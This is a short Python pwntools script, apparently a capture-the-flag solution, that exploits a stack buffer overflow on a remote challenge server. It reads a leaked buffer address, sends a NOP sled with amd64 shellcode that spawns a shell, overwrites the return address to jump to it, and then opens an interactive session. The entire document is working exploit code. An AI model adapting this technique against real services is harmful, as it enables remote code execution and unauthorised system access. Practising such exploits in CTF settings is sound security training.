from pwn import *

r = remote("ctf.j0n9hyun.xyz",1633)

shellcode = pwnlib.shellcraft.amd64.linux.sh()

payload = "\x90" * (17952 - 48)

payload += asm(shellcode, arch='amd64')

payload += "A"*(10000+8)

r.recvuntil("buf: ")

text = r.recv(14)

buf_addr = int(text, 16)

payload += p64(buf_addr)

r.sendline(payload)

r.interactive()
